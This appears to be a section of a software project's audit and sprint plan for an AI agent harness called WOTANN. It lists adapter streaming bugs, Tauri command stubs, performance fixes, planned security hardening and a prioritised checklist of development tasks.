
**Developer Wellness:**
17. **Cognitive Load Adapter** — adapts response style based on typing speed/error frequency (terse when sharp, verbose when struggling)
18. **Voice Journaling** — "Hey WOTANN, note: I chose Redux because..." linked to current file, queryable later

**Trust & Verification:**
19. **Provenance Ledger** — Merkle tree of every AI action with timestamps (EU AI Act compliance)
20. **Context Genealogy** — expandable "why this context?" panel showing what was included/excluded and why

**Ambient Awareness:**
21. **Workspace Weather** — ambient codebase health (sunny/cloudy/stormy) across all devices
22. **Ambient Sonification** — spatial audio status (AirPods) with different agent workers in different positions
23. **Instinct Engine** — guards that evolve based on real hit/miss data (strengthen guards that catch real bugs)

**Cost Intelligence:**
24. **Provider Arbitrage** — decompose tasks into subtasks, route each to cheapest qualified provider
25. **Decay Predictor** — predicts which code will become stale within 90 days using dependency + history analysis

### 76.6 AGENT-TO-AGENT COORDINATION (Fleet System) — v0.3.0

All building blocks exist: AgentRegistry (14 agents), AgentMessageBus (path-addressed), WaveExecutor (parallel), Coordinator (worktrees), SupabaseRelay (cross-device). Need 7 new files (~1,650 LOC):

- `fleet-coordinator.ts` — orchestrates decompose→assign→track→merge
- `fleet-worker.ts` — wraps agent execution in worktree with message bus
- `fleet-planner.ts` — Opus decomposes task into parallelizable subtasks
- `fleet-merger.ts` — merges worktrees, resolves conflicts, runs verification
- `fleet-monitor.ts` — aggregates status, pushes to all devices
- `fleet-types.ts` — FleetRun, FleetPlan, FleetSubtask, FleetWorkerState
- `fleet-rpc.ts` — 11 RPC methods for cross-device control

Desktop: FleetPanel as 5th tab. iOS: Fleet monitoring screen. Watch: FleetComplication + approval. Forward-compatible with MCP A2A (Q3 2026) via transport abstraction.

Effort: 16-21 days.

### 76.7 UX PHILOSOPHY — The Trust Ladder

Three cross-cutting UX principles from the journey audit:

1. **The Trust Ladder**: observe → interact → delegate → automate. Every user moves from skepticism to trust. Support this with configurable approval levels (approve every action → approve plans only → approve destructive only → full auto).

2. **The Notification Problem**: Autonomous mode is unusable without reliable cross-device notifications. Route: desktop notification → iOS push → Slack/Telegram fallback → email last resort.

3. **The Configuration Burden**: Every feature behind a config file is a feature 90% of users never discover. Absorb configuration into the UI — model routing, skill creation, daemon rules, channel setup should all be doable from the GUI.

### 76.8 UPDATED GRAND TOTALS (FINAL)

| Sprint | Items | Hours |
|---|---|---|
| Sprint 0 | 12 (+S0-12) | ~2h |
| Sprint 1 | 20 (+S1-19, S1-20) | ~32h |
| Sprint 2 | 54 (+S2-50 through S2-54) | ~70h |
| Sprint 3 | 7 | ~37h |
| Sprint 4 | 21 (+S4-16 through S4-21) | ~48h |
| Sprint 5 (backlog) | 20 | ~21h |
| **v0.2.0 TOTAL** | **114 sprint + 20 backlog** | **~210h** |
| v0.3.0 (Fleet + competitive parity) | ~50 items | ~250h |
| v0.4.0 (Builder + novel features) | ~60 items | ~400h |
| **FULL ROADMAP** | **~244 items** | **~880h** |

Timeline: **~8 weeks** to v0.2.0 (adjusted from 7 weeks with production readiness + UI additions).

---

### 76.9 FINAL SUPERCHARGED PROMPT FOR IMPLEMENTATION SESSION

```
Read /Users/gabrielvuksani/Desktop/agent-harness/wotann/docs/MASTER_AUDIT_2026-04-14.md — it's the single source of truth (3,700+ lines, 76 sections).

EXECUTION PLAN: §72 (main plan) + §72.1 (30 missing items + dependency fixes) + §72.2 (protocol notes + pacing) + §74 (multi-provider cost) + §75 (runtime UX bugs) + §76 (production readiness + novel features). Apply corrections from §72.1 before executing §72.

WOTANN = 140K LOC TypeScript AI agent harness + Tauri desktop + iOS companion. 28 Opus agents audited every subsystem. 114 sprint items across 5 sprints (~210h) to v0.2.0.

THE 6 HIGHEST-LEVERAGE FIXES:
1. `agent-bridge.ts:78` — add `tools: options.tools` (1 LINE enables capability equalization)
2. `commands.rs:342` — replace send_message stub with real UDS→KAIROS forwarder (~50 LOC Rust, unlocks ~1,700 LOC frontend)
3. `kairos-rpc.ts:2708` — wire autonomous.run to executor.execute() (~15 LOC, unlocks 2,000 LOC)
4. `runtime.ts:557,581,628` — replace 8 hardcoded "anthropic" defaults with resolved provider
5. `identity.ts:37` — fix SOUL.md regex (~30 chars, enables Norse identity)
6. `CREDENTIALS_NEEDED.md` — DELETE THIS FILE FIRST (Supabase creds on PUBLIC GitHub)

PROTOCOL: Daemon IPC = NDJSON over Unix Domain Socket (~/.wotann/kairos.sock), NOT HTTP. Auth via metadata.X-WOTANN-Token. See §72.2.

GIT BRANCHING: Create branch before each sprint. Merge only on green regression.

Sprint 0 first (12 items, ~2h). Then Sprint 1 (20 items, ~32h). Commit after each group. Run `npm run typecheck && npm test` after each sprint.

§69 = definitive truth table. §74 = multi-provider pricing. §76 = production readiness + novel features roadmap.
```

---

---

## §77. ROUND 11 — Runtime Crashes, Streaming Gaps, Tauri Stubs, Performance

> 4 final Opus agents (32 total). Covers: circular dependencies, all 104 Tauri commands, streaming format normalization across all 6 adapters, visual/layout/performance bugs.

### 77.1 CRITICAL: TUI Crashes on Launch

`wotann start` (default command) **crashes immediately** — `code-excerpt` package has corrupted `dist/` directory. Chain: `index.js` → `ink` → `code-excerpt` → ERR_MODULE_NOT_FOUND. Fix: `npm ci` to restore.

Also: fragile circular value import `kairos.ts` ↔ `event-triggers.ts` — works by function hoisting accident, one refactor away from TDZ crash. Fix: extract `matchesCronSchedule` to `daemon/cron-utils.ts`.

### 77.2 STREAMING: Tool Calls Lost on RESPONSE Side Too

**The tool serialization fix (S1-3 through S1-6) only fixes the REQUEST.** The RESPONSE parsing also drops tool calls in 5 of 6 adapters. This is a SEPARATE bug that must be fixed alongside S1-3 through S1-6 or tool calling still won't work end-to-end.

| Adapter | text | tool_use | thinking | done | error | usage |
|---|---|---|---|---|---|---|
| **Ollama** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| Anthropic | ✅ | ❌ lost | ❌ lost | ✅ | ✅ | partial |
| Anthropic Sub | ✅ | ❌ lost | ✅ | ✅ | ✅ | ✅ |
| OpenAI-compat | ✅ | ❌ lost | ❌ | ✅ | ✅ | ❌ (always 0) |
| Codex | ✅ | ❌ lost | ❌ lost | ✅ | ✅ | ✅ |
| Copilot | ✅ | ❌ lost | ❌ | ✅ | ✅ | ❌ (always 0) |

**Root causes:**
- Anthropic adapter only handles `content_block_delta` with text — ignores `content_block_start` entirely (tool_use + thinking blocks)
- OpenAI-compat declares `tool_calls` in type but never reads it — partial JSON reassembly not implemented
- Codex doesn't handle `response.function_call_arguments.delta` or `response.reasoning.delta`
- OpenAI/Copilot never send `stream_options: { include_usage: true }` — usage always 0
- `StreamChunk` interface has no `stopReason` field — can't distinguish tool_calls stop vs natural stop

### 77.3 TAURI COMMANDS: 28 Issues in 104 Commands

| Category | Count | Examples |
|---|---|---|
| Pure stubs (fake data) | 7 | `send_message` (deprecated), `get_cu_action_result` (always true), `process_pdf` (zeros), `get_lifetime_token_stats` (zeros) |
| Dead commands (non-existent RPC) | 2 | `get_dispatch_items` → "dispatch.list" doesn't exist, `get_agent_proof` → calls wrong server |
| Error swallowers | 13 | `run_doctor` silently succeeds when daemon down, `get_audit_trail` silently drops entries, 11 more return `[]` on failure |
| Data loss | 2 | `get_cost_details` drops daily_usage/provider_costs even on success, `run_autonomous` fakes tokens as `text.len()/4` |
| Security-sensitive | 4 | `execute_command` (bypassable blocklist), `write_file` (any path under $HOME), `kill_process` (any PID), `save_api_keys` (plaintext) |

### 77.4 PERFORMANCE HOTSPOTS

**Desktop (React):**
- ChatView: no virtualization + MessageBubble not memoized + auto-scroll fires per streaming char = **visible lag at 100+ messages**
- WorkflowBuilder: polling memory leak via stale closure (phantom network requests after cancel)
- AudioWaveform: 60fps React state updates (should be canvas/ref)
- ScreenPreview: full base64 screenshots every 2s without caching/downsampling
- ProviderConfig: 60s polling even when settings view not visible

**iOS (SwiftUI):**
- `AppState.updateConversation` triggers global @Published re-render per streaming chunk — **every view re-evaluates per character**
- MarkdownView: uses `AnyView` (kills diffing) + re-parses markdown on every render
- RemoteDesktop: full-resolution screenshots stored in memory without downsampling
- ChatViewModel: creates new `OnDeviceModelService()` per offline message (should be singleton)
- HomeView: sorts all conversations on every render (O(n log n) should be O(n) via `max(by:)`)

### 77.5 NEW SPRINT ITEMS FROM ROUND 11

#### Add to Sprint 0 (CRITICAL):

| ID | Task | Effort | Verify |
|---|---|---|---|
| S0-13 | **Fix corrupted code-excerpt** — run `npm ci` to restore node_modules, add to CI setup | 5 min | `node dist/index.js --version` doesn't crash |
| S0-14 | **Extract matchesCronSchedule to daemon/cron-utils.ts** — break fragile circular value import | 30 min | `npm run typecheck` |

#### Add to Sprint 1 (tool calling response parsing — PAIRS with S1-3 through S1-6):

| ID | Task | Effort | Verify |
|---|---|---|---|
| S1-21 | **Anthropic adapter: handle content_block_start + tool_use + thinking blocks** — parse `content_block_start` events, accumulate `input_json_delta` for tool calls, yield `tool_use` and `thinking` StreamChunks | 3h | `npm test -- anthropic-adapter` |
| S1-22 | **OpenAI-compat adapter: parse tool_calls from stream + partial JSON reassembly** — accumulate `choices[0].delta.tool_calls` fragments by index, reassemble JSON, yield `tool_use` chunk on completion | 3h | `npm test -- openai-compat` |
| S1-23 | **Codex adapter: parse function_call + reasoning events** — handle `response.function_call_arguments.delta` and `response.reasoning.delta` | 2h | `npm test -- codex-adapter` |
| S1-24 | **Copilot adapter: same as S1-22 for tool_calls** | 1h | `npm test -- copilot-adapter` |
| S1-25 | **Anthropic subscription adapter: handle tool_use content blocks** | 1h | `npm test -- anthropic-subscription` |
| S1-26 | **Add stream_options to OpenAI/Copilot** — `stream_options: { include_usage: true }` in request body | 30 min | Token usage > 0 after streaming query |
| S1-27 | **Add stopReason to StreamChunk interface** — normalize across providers: "end_turn"/"stop" → "stop", "tool_use"/"tool_calls" → "tool_calls", "max_tokens"/"length" → "max_tokens" | 1h | `npm run typecheck` |

#### Add to Sprint 2 (Tauri + performance):

| ID | Task | Effort | Verify |
|---|---|---|---|
| S2-55 | **Fix get_dispatch_items dead RPC** — change "dispatch.list" to existing RPC or add handler | 30 min | Desktop dispatch view loads |
| S2-56 | **Fix get_agent_proof RPC target** — change from companion to daemon "proofs.list" | 30 min | Proof viewer loads in desktop |
| S2-57 | **Fix run_doctor to report daemon failure** — return error result instead of empty success | 30 min | `wotann doctor` with daemon down shows "daemon offline" |
| S2-58 | **Fix get_cost_details data mapping** — parse daemon's `history` field into `daily_usage` and `provider_costs` | 1h | Cost breakdown shows real charts |
| S2-59 | **Add error propagation to 13 error-swallower commands** — return `Err()` instead of empty `Ok()` on daemon failure | 2h | Desktop shows error toasts instead of empty views |
| S2-60 | **Memoize MessageBubble + add chat virtualization** — `React.memo(MessageBubble)` + `react-window` or `@tanstack/react-virtual` for message list | 3h | 200-message chat renders without lag |
| S2-61 | **Fix WorkflowBuilder polling leak** — use `useRef` for `runningWorkflowId` instead of closure capture | 30 min | Cancel workflow, no phantom network requests |
| S2-62 | **Fix AudioWaveform** — replace React state with `useRef` + canvas for 60fps animation | 1h | Waveform renders smoothly without React re-renders |

#### Add to Sprint 4 (iOS performance):

| ID | Task | Effort | Verify |
|---|---|---|---|
| S4-22 | **Fix AppState streaming re-render** — debounce `updateConversation` or use separate `@Published` for active streaming message | 2h | iOS chat doesn't stutter during streaming |
| S4-23 | **Fix MarkdownView** — replace `AnyView` with `@ViewBuilder`, cache parse results | 1h | Chat with many messages scrolls smoothly |
| S4-24 | **Fix RemoteDesktop screenshot memory** — downsample to screen resolution before storing in state | 1h | Memory usage stable during remote desktop |
| S4-25 | **Make OnDeviceModelService a singleton** — shared instance instead of per-message creation | 30 min | Offline messages don't create new model instances |

### 77.6 FINAL UPDATED TOTALS

| Sprint | Previous | New Items | Final | Hours |
|---|---|---|---|---|
| Sprint 0 | 12 | 2 (S0-13, S0-14) | **14** | ~3h |
| Sprint 1 | 20 | 7 (S1-21 through S1-27) | **27** | ~44h |
| Sprint 2 | 54 | 8 (S2-55 through S2-62) | **62** | ~80h |
| Sprint 3 | 7 | 0 | **7** | ~37h |
| Sprint 4 | 21 | 4 (S4-22 through S4-25) | **25** | ~52h |
| Sprint 5 | 20 | 0 | **20** | ~21h |
| **v0.2.0** | **134** | **21** | **135 sprint + 20 backlog** | **~237h** |

Timeline: **~9 weeks** to v0.2.0. Sprint 2 (62 items / 80h) MUST be split into 4 sub-sprints of ~20h each.

---

---

# §78. UNIFIED SPRINT PLAN — THE SINGLE EXECUTION CHECKLIST

> **THIS SECTION SUPERSEDES ALL PRIOR SPRINT LISTS.** Items from §72, §72.1, §74, §75, §76, §77 are merged here in dependency order. Claude Code: execute this section top to bottom. Mark items `[x]` as you complete them. For implementation details on any item, search the document for its ID (e.g., "S1-7").

> **Protocol**: Daemon IPC = NDJSON over UDS (`~/.wotann/kairos.sock`), NOT HTTP. Auth via `metadata.X-WOTANN-Token`. See §72.2.
> **Git**: Branch before each sprint (`git checkout -b sprint-N`). Merge only after `npm run typecheck && npm test` pass.
> **Regression**: Full `npm run typecheck && npm test` after Sprint 0+1, after Sprint 2, after Sprint 4.
> **References**: §69 = definitive truth table. §74 = multi-provider pricing. §76.5 = novel features. §76.6 = Fleet design.

---

## SPRINT 0 — IMMEDIATE (~3h, all independent, parallelize freely)

- [ ] **S0-1** Delete `CREDENTIALS_NEEDED.md` (Supabase creds on PUBLIC GitHub). `git rm` + rotate key at supabase.com. Verify: `test ! -f CREDENTIALS_NEEDED.md`
- [ ] **S0-13** Run `npm ci` to fix corrupted `code-excerpt` dist/. Verify: `node dist/index.js --version` doesn't crash
- [ ] **S0-2** Fix SOUL.md regex at `identity.ts:37` — change `/## Core Values/` to `/## (?:Core Values|What You Value)/`. Verify: `npm test -- identity`
- [ ] **S0-3** Fix thin-client socket at `thin-client.ts:22` — `"daemon.sock"` → `"kairos.sock"`. Verify: `grep -q "kairos.sock" src/cli/thin-client.ts`
- [ ] **S0-4** `npm audit fix`. Verify: `npm audit --audit-level=high` exits 0
- [ ] **S0-5** Rename `src/context/turboquant.ts` → `ollama-kv-compression.ts`, update imports. Also `grep -r "turboquant" tests/`. Verify: `npm run typecheck`
- [ ] **S0-6** Move `@anthropic-ai/claude-agent-sdk` to `peerDependencies` (or `optionalDependencies` if too many imports). Verify: `npm run typecheck`
- [ ] **S0-7** Gate `WOTANN_AUTH_BYPASS` at `kairos-ipc.ts:125` — add `&& process.env["NODE_ENV"] === "test"`. Verify: `npm run typecheck`
- [ ] **S0-8** Fix webhook timing-safe compare at `webhook.ts:104` — use `timingSafeEqual`. Verify: `npm run typecheck`
- [ ] **S0-9** Add YAML frontmatter to 10 skills (`a2ui, canvas-mode, batch-processing, computer-use, cost-intelligence, lsp-operations, mcp-marketplace, benchmark-engineering, prompt-testing, self-healing`). Verify: `npm test -- skills`
- [ ] **S0-10** Migrate ESLint 9 — `.eslintrc.json` → `eslint.config.js`. Verify: `npx eslint src/ --max-warnings=0` produces real output
- [ ] **S0-11** Fix `config.set` file perms at `kairos-rpc.ts:1899` — add `{mode: 0o600}`. Verify: file permissions
- [ ] **S0-12** Auto-pull Gemma 4 if Ollama has no models — check `ollama list`, pull if empty. Verify: `ollama list` shows model
- [ ] **S0-14** Extract `matchesCronSchedule` to `daemon/cron-utils.ts` — break circular import. Verify: `npm run typecheck`

---

## SPRINT 1 — TRANSPORT + CORE WIRING (~44h)

### Group A: Tool Serialization — REQUEST side (unlocks harness thesis)
- [ ] **S1-1** Add `tools: options.tools` to `agent-bridge.ts:78-86`. (1 line!) Verify: `npm run typecheck`
- [ ] **S1-2** Wire `parseToolCallFromText()` into response pipeline in `agent-bridge.ts`. (~30 LOC) Depends: S1-1. Verify: `npm test -- capability-augmenter`
- [ ] **S1-3** Add tools to Anthropic adapter at `anthropic-adapter.ts:126-132`. Verify: `npm run typecheck`
- [ ] **S1-4** Add tools to OpenAI-compat adapter at `openai-compat-adapter.ts:88-94`. (Covers 13 providers!) Verify: `npm run typecheck`
- [ ] **S1-5** Add tools to Copilot adapter at `copilot-adapter.ts:251-257`. Verify: `npm run typecheck`
- [ ] **S1-6** Add tools to Codex adapter at `codex-adapter.ts:214-221`. Verify: `npm run typecheck`

### Group A2: Tool Serialization — RESPONSE side (without this, tool calling still dead)
- [ ] **S1-21** Anthropic adapter: parse `content_block_start` + `tool_use` + `thinking` blocks. (~3h) Verify: `npm test -- anthropic-adapter`
- [ ] **S1-22** OpenAI-compat adapter: parse `tool_calls` from stream + partial JSON reassembly. (~3h) Verify: `npm test -- openai-compat`
- [ ] **S1-23** Codex adapter: parse `function_call` + `reasoning` events. (~2h) Verify: `npm test -- codex-adapter`
- [ ] **S1-24** Copilot adapter: same tool_calls parsing as S1-22. (~1h) Verify: `npm test -- copilot-adapter`
- [ ] **S1-25** Anthropic subscription adapter: handle `tool_use` content blocks. (~1h) Verify: `npm test -- anthropic-subscription`
- [ ] **S1-26** Add `stream_options: { include_usage: true }` to OpenAI/Copilot request bodies. Verify: token usage > 0
- [ ] **S1-27** Add `stopReason` to `StreamChunk` interface — normalize across providers. Verify: `npm run typecheck`

### Group B: Desktop Transport (unlocks ~1,700 LOC frontend)
- [ ] **S1-7** Replace `send_message` Tauri stub at `commands.rs:342` with real UDS→KAIROS forwarder. (~50 LOC Rust, 3-5h) See §72.2 for NDJSON protocol. Verify: `cd desktop-app && npm run tauri:dev`, test @ references
- [ ] **S1-8** Verify @ references work after S1-7. Depends: S1-7. Verify: type `@file:` in desktop chat
- [ ] **S1-9** Verify ghost-text works after S1-7. Depends: S1-7. Verify: open Editor, start typing

### Group C: Autonomous Mode (unlocks 2,000 LOC)
- [ ] **S1-12** Wire `autonomous.run` RPC at `kairos-rpc.ts:2708` to `executor.execute()`. (~15 LOC) Verify: daemon RPC test (see §72.1 for NDJSON command)

### Group D: Provider Defaults (fixes multi-provider)
- [ ] **S1-16** Replace 8 hardcoded `"anthropic"` in `runtime.ts:557,581,628,1091,1180,1229,1255` with resolved provider. (~2h) Verify: `grep -n '"anthropic"' src/core/runtime.ts` returns 0 functional hardcodes
- [ ] **S1-17** Fix `oracle-worker.ts:53-54` — use session provider instead of hardcoded Claude models. Verify: `npm run typecheck`
- [ ] **S1-18** Fix `app-state.ts:110` and `conversation-manager.ts:117` — default to discovered provider. Verify: `grep '"anthropic"' src/desktop/app-state.ts` returns 0

### Group E: ECDH + Daemon Health
- [ ] **S1-13** Standardize 3 ECDH implementations on P-256 + raw 64B + HKDF-SHA256. (~3h) Verify: `npm test -- secure-auth`
- [ ] **S1-14** Add memory retention: 30-day rolling delete for audit_trail + auto_capture, cap trace-analyzer at 10K, cap arena at 500. (~3h) Verify: `npm run typecheck`
- [ ] **S1-15** Add `.off()` cleanup for event listeners in all 23 files with `.on()`. (~4h) Verify: `grep -r "\.off\(" src/ | wc -l` > 0

### Group F: Automagical Setup
- [ ] **S1-19** Free tier guided setup — add "Get free API key" links for Groq/Gemini in onboarding. (~1h) Verify: onboarding shows links
- [ ] **S1-20** Proactive first insight on project open — surface one actionable finding after project scan. (~2h) Verify: open project, see insight

### Group G: Workflow Fixes (need S1-7 transport for desktop testing)
- [ ] **S1-10** Add `workflow.save` RPC handler. Depends: S1-7. Verify: save workflow from desktop
- [ ] **S1-11** Fix `workflow.start` to use user nodes, not just builtins. Depends: S1-7, S1-10. Verify: run custom workflow

---

## SPRINT 2 — WIRING + SECURITY + UX (~80h, split into 4 sub-sprints)

### Sub-sprint 2a: Core Wiring (~20h)
- [ ] **S2-1** Wire MultiFileComposer — render + create `composer_plan` Tauri command + RPC handler. Depends: S1-7. (~3h)
- [ ] **S2-2** Wire Plan mode to desktop UI — Cmd+2 routes to ultraplan. Depends: S1-7. (~2h)
- [ ] **S2-3** Fix shell injection at `voice-mode.ts:509` — stdin pipe instead of `sh -c`. (~1h)
- [ ] **S2-4** Fix shell injection at `tts-engine.ts:455` — same fix. (~30 min)
- [ ] **S2-5** Fix `composer.apply` path validation at `kairos-rpc.ts:3040`. (~1h)
- [ ] **S2-6** Fix `session.resume` path traversal at `kairos-rpc.ts:2742`. (~30 min)
- [ ] **S2-7** Reconcile README — use §69 truth table (21 intel modules, 10 orch patterns, etc.). (~1h)
- [ ] **S2-8** Lower learning stack activation gates in `autodream.ts` — 30min→10min idle. (~1h)
- [ ] **S2-9** Delete ~4,500 LOC dead code (list in §72). Remove from lib.ts + runtime.ts imports. (~2h) Verify: `npm run typecheck && npm test`
- [ ] **S2-10** Wire deep-research search callbacks from runtime. (~2h)
- [ ] **S2-11** Fix token-stats.json tracking — debug why 970 sessions recorded 0 tokens. (~2h)
- [ ] **S2-12** Delete 6 duplicate iOS .xcodeproj files. (~5 min)
- [ ] **S2-13** Fix `.wotann/.wotann/` nesting in config.ts. (~30 min)

### Sub-sprint 2b: Hooks + Provider Coverage (~20h)
- [ ] **S2-14** Upgrade 5 fake-guarantee hooks to block (DestructiveGuard, CompletionVerifier, TDDEnforcement, ReadBeforeEdit, ResultInjectionScanner). **Then update tests.** (~2h)
- [ ] **S2-15** Implement 3 hollow hooks (PreCompactWALFlush, SessionSummary, MemoryRecovery). Depends: S2-14 green. (~2h)
- [ ] **S2-16** Fix `tools.ts` TOOL_CATALOG — derive from runtime registration. (~1h)
- [ ] **S2-17** Add missing provider profiles in `capabilities.ts` (copilot, xai, mistral). (~30 min)
- [ ] **S2-31** Fix Anthropic subscription adapter tools (same as S1-3). (~30 min)
- [ ] **S2-32** Expand PRICING_TABLE to all 17 providers with April 2026 rates (see §74). (~1h)
- [ ] **S2-33** Rewrite MODEL_PREFERENCES to provider-aware `{provider, model}` pairs. (~2h)
- [ ] **S2-34** Implement conservative downgrade rules (≥95% confidence, never-downgrade conditions). (~2h)
- [ ] **S2-35** Update stale default models in registry (xai `grok-3`→`grok-4.1-fast`, deepseek→`v4`). (~15 min)
- [ ] **S2-36** Implement Layer 1 cost optimizations (prompt ordering, tool-call dedup, metadata injection). (~3h)

### Sub-sprint 2c: Fixes from Rounds 6-9 (~20h)
- [ ] **S2-18** Debug CLI autonomous ECANCELED at `index.ts:1950`. (~3h)
- [ ] **S2-19** Fix `wotann ci` fake stub at `index.ts:2958`. (~1h)
- [ ] **S2-20** Fix SSRF DNS rebinding in `web-fetch.ts:153-170`. (~2h)
- [ ] **S2-21** Wire iOS TaskMonitor executeTask callback at `companion-server.ts:606`. (~2h)
- [ ] **S2-22** Fix iOS MobileVoiceHandler fake at `ios-app.ts:310-351`. (~1h)
- [ ] **S2-23** Fix conversation-manager/project-manager persistence lies. (~2h)
- [ ] **S2-24** Wire `mode.set` to `runtime.setMode()` at `kairos-rpc.ts:2214`. (~30 min)
- [ ] **S2-25** Fix `cost.arbitrage` hardcoded prices at `kairos-rpc.ts:2170`. (~1h)
- [ ] **S2-26** Amend CLAUDE.md immutability claim. (~5 min)
- [ ] **S2-27** Delete `computer-use.md` skill (fake DSL). (~5 min)
- [ ] **S2-28** Delete `computer_use/input.rs` legacy (456 LOC). (~30 min) Verify: `cargo check`
- [ ] **S2-29** Fix `wotann companion start` Commander.js schema. (~15 min)
- [ ] **S2-30** Fix stale daemon state in `start.ts` — PID liveness check + atomic status. (~1h)

### Sub-sprint 2d: UX + Desktop + Streaming (~20h)
- [ ] **S2-37** Add Stop Generating button to ChatView. (~1h)
- [ ] **S2-38** Fix iOS cancel to send RPC to daemon. (~30 min)
- [ ] **S2-39** Guard provider switch during streaming. (~30 min)
- [ ] **S2-40** Fix resolveLegacyView — add 14 missing views to AppView type. (~1h)
- [ ] **S2-41** Fix fork conversation empty atMessageId. (~30 min)
- [ ] **S2-42** Wire PerceptionAdapter into ComputerUseAgent — 3-tier vision routing. (~3h)
- [ ] **S2-43** Add chat pane to ComputerUsePanel. (~2h)
- [ ] **S2-44** Fix provider validation — verify key validity, show "verified" vs "unverified". (~2h)
- [ ] **S2-45** Fix conversations.list to return ALL conversations + add messages.list RPC. (~3h)
- [ ] **S2-46** Add conversation persistence — write to `~/.wotann/desktop/conversations/`. (~3h)
- [ ] **S2-47** Wire Supabase relay message routing in `kairos.ts`. (~2h)
- [ ] **S2-48** Fix handleQuery model fallback — pass selected model through, not hardcoded "gemma4". (~1h)
- [ ] **S2-49** Add error feedback to 13 engine.ts error-swallower functions. (~1h)
- [ ] **S2-50** Add AI instruction pane to iOS RemoteDesktopView. (~2h)
- [ ] **S2-51** Add iOS feature discoverability — "Explore" section on HomeView. (~2h)
- [ ] **S2-52** Add memory CRUD (create/edit/delete) to both platforms. (~2h)
- [ ] **S2-53** Add iOS workflow run button. (~30 min)
- [ ] **S2-54** Add iOS standalone mode in onboarding. (~3h)
- [ ] **S2-55** Fix `get_dispatch_items` dead RPC. (~30 min)
- [ ] **S2-56** Fix `get_agent_proof` RPC target. (~30 min)
- [ ] **S2-57** Fix `run_doctor` to report daemon failure. (~30 min)
- [ ] **S2-58** Fix `get_cost_details` data mapping. (~1h)
- [ ] **S2-59** Add error propagation to 13 error-swallower Tauri commands. (~2h)
- [ ] **S2-60** Memoize MessageBubble + add chat virtualization. (~3h)
- [ ] **S2-61** Fix WorkflowBuilder polling leak (useRef). (~30 min)
- [ ] **S2-62** Fix AudioWaveform (useRef + canvas). (~1h)

---

## SPRINT 3 — COMPETITIVE PARITY + NATIVE GEMINI (~37h)

- [ ] **S3-1** Build native Gemini adapter (`gemini-native-adapter.ts`). No dependencies. (~6h) Verify: `GEMINI_API_KEY=... wotann run "search for WOTANN" --provider gemini`
- [ ] **S3-2** Port hermes 11 open-model tool parsers. No dependencies. (~12h) Verify: `npm test -- tool-parsers`
- [ ] **S3-3** Port hermes shadow-git auto-checkpointing. (~4h) Verify: `npm test -- shadow-git`
- [ ] **S3-4** Real TurboQuant vector store via `turboquant-wasm` + MiniLM ONNX. Depends: S0-5. (~6h) Verify: `npm test -- vector-store`
- [ ] **S3-5** Port OpenClaw active-memory blocking sub-agent. (~4h) Verify: `npm test -- active-memory`
- [ ] **S3-6** Set Gemini 3 Flash as default free-tier provider. Depends: S3-1. (~1h)
- [ ] **S3-7** Vision emulation — real OCR pipeline (Florence-2 ONNX or macOS Vision). (~4h)

---

## SPRINT 4 — REFACTOR + PRODUCTION READINESS + SHIP (~52h)

### Refactor
- [ ] **S4-1** Split `runtime.ts` into 4 files (~800 each). Depends: S1-1, S1-12, S2-5, S2-6. (~6h) Verify: `npm run typecheck && npm test`
- [ ] **S4-2** Split `kairos-rpc.ts` into 5 files by domain. Depends: S1-10, S1-11, S1-12, S2-5, S2-6. (~6h) Verify: `npm run typecheck && npm test`

### iOS
- [ ] **S4-3** iOS @Observable migration (215 → 0 @ObservableObject). (~4h) Verify: Xcode build
- [ ] **S4-4** iOS SPM resolve + delete duplicate .xcodeproj. Depends: S2-12. (~1h) Verify: `ls ios/.build/checkouts/`
- [ ] **S4-13** iOS Dynamic Type — replace 243 hardcoded font sizes. (~4h)
- [ ] **S4-14** iOS offline state handling — all views check `isConnected` first. (~2h)
- [ ] **S4-15** Fix conversation ID format — standardize UUID across all platforms. (~1h)
- [ ] **S4-22** Fix AppState streaming re-render — debounce `updateConversation`. (~2h)
- [ ] **S4-23** Fix MarkdownView — replace `AnyView`, cache parse. (~1h)
- [ ] **S4-24** Fix RemoteDesktop screenshot memory — downsample. (~1h)
- [ ] **S4-25** Make OnDeviceModelService a singleton. (~30 min)

### Desktop Polish
- [ ] **S4-8** Add QR code to `wotann link`. (~30 min)
- [ ] **S4-9** Expand `wotann doctor` (8+ checks). (~2h)
- [ ] **S4-10** Fix `user.ts` prompt module. (~30 min)
- [ ] **S4-11** Replace 30+ hardcoded hex colors with CSS variables. (~2h)
- [ ] **S4-12** Add light mode CSS. (~3h)

### Production Readiness
- [ ] **S4-5** npm publish prep — `.npmignore`, clean tarball. (~1h) Verify: `npm pack --dry-run`
- [ ] **S4-6** GitHub Release workflow (tags → DMG + npm). (~3h)
- [ ] **S4-7** install.sh fixes (Ollama install, Linux PATH). (~1h)
- [ ] **S4-16** Tauri auto-updater plugin. (~3h)
- [ ] **S4-17** Sentry crash reporting. (~2h)
- [ ] **S4-18** macOS Keychain for API keys. (~3h)
- [ ] **S4-19** SQLite integrity check on startup. (~1h)
- [ ] **S4-20** `wotann export/backup` command. (~1h)
- [ ] **S4-21** Test schema migration 0.1.0→0.5.0. (~1h)

---

## SPRINT 5 — BACKLOG (~21h, post-v0.2.0)

- [ ] **S5-1** Edge TTS integration (30 min)
- [ ] **S5-2** Sidecar binaries download-on-first-run (2h)
- [ ] **S5-3** Delete mcp-marketplace.ts vaporware (30 min)
- [ ] **S5-4** Delete SubagentLimit + LSP dead middleware (30 min)
- [ ] **S5-5** Wire advisory middleware flag consumers (2h)
- [ ] **S5-6** Rename offload-to-disk (1h)
- [ ] **S5-7** Fix macOS STT misleading detection (2h)
- [ ] **S5-8** Wire remaining 5 forgecode techniques (2h)
- [ ] **S5-9** Wire/delete 8 lib.ts-only orchestration modules (1h)
- [ ] **S5-10** Fix auto-commit simulateCommit (1h)
- [ ] **S5-11** Wire Live Activities Activity.request() (2h)
- [ ] **S5-12** Wire 6 getter-only intelligence modules (3h)
- [ ] **S5-13** Add daemon --verbose flag (15 min)
- [ ] **S5-14** Replace LLM-based memory.verify (1h)
- [ ] **S5-15** Keyboard focus indicators on header buttons (30 min)
- [ ] **S5-16** Keyboard handling for sidebar context menu (30 min)
- [ ] **S5-17** Fix aria-live streaming token announcements (1h)
- [ ] **S5-18** ViewSkeleton spinner animation (30 min)
- [ ] **S5-19** Fix settings save race condition (30 min)
- [ ] **S5-20** iOS empty catch blocks in GitPanel/Diagnostics (15 min)

---

## CHECKLIST SUMMARY

| Sprint | Items | Hours | Status |
|--------|-------|-------|--------|
| Sprint 0 | 14 | ~3h | ☐ Not started |
| Sprint 1 | 27 | ~44h | ☐ Not started |
